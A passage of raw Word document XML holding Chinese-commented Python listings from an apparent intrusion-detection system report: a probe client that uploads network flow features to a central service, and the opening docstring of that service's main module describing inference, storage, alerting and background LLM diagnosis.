          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"中心地址 {center_url} 不在本机/局域网内，因此走了代理环境变量；"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21028197">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"请检查 ALL_PROXY 的写法（httpx 只认 socks5://，不认 socks://）。"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA6FCD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5103C10F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5706CFC8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def close(self) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB67720">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self._client.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BCA0AC0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68E51E45">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def send(self, feature_names, flows, window) -&gt; dict | None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BCFA29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """flows: [(key, first_seen, last_seen, values)]；返回中心端回执，失败返回 None。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58275E78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not flows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB66AB2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3058AC37">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        payload = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A61BCF1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "probe_id": self.probe_id,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD37C1B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "sent_at": time.time(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E18D447">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "window": window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150AE48C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "feature_names": list(feature_names),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F38BBF8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "flows": [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBF9F60">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A02C1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "key": "|".join(str(p) for p in key),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C34C148">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "first_seen": first,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4E31DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "last_seen": last,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD1FAE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                    "values": values,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A099401">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DC5142">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                for key, first, last, values in flows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C75D67B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BF04C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11770158">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191AE609">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            resp = self._client.post(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C795EC5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                self.url,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70669A77">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                json=payload,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="193ECBF3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                headers={"X-Probe-Token": self.token},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D13C610">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43BA1FF5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        except httpx.HTTPError as exc:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B00FDBD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.unreachable += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14448445">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(f"[上报] 中央服务不可达：{exc}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68008E86">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED8BEB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if resp.status_code != 200:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B1FE0F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.failed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CA00C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(f"[上报] 中心端返回 {resp.status_code}：{resp.text[:200]}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DA3D00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E6DD21">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.sent += len(flows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321D6376">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return resp.json() if resp.content else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C40BA73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B7E684F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78A587F3">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42C7C6CA">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-8　center/main.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（278 行）　M6 中心服务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDF5C77">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M6 中心服务：接收探针上报 → 小模型推理 → 落库 → 触发大模型诊断。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F54806D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C745DAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>启动::</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4189FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43D043A6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    uvicorn center.main:app --host 0.0.0.0 --port 8000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28607639">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 接口文档在 /docs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19668A05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B471AC4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>几个刻意的设计：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74661445">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C742E7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **上报路径不做大模型调用**。诊断放在后台任务里跑，和探针上报解耦：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042445E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  LLM 慢或挂掉，检测链路照常工作，只是报告变成模板版并标注出来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7869F22D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **列序校验不宽容**。探针报上来的 feature_names 必须和训练时逐项相同，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F626704">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  不匹配直接 400，而不是按名字重排——重排会把"缺列"悄悄变成"错位"。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EC3FD7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **告警与流分开存**。每条流都留档（含原始特征），只有非 BENIGN 的升级成告警。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2F8EF5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
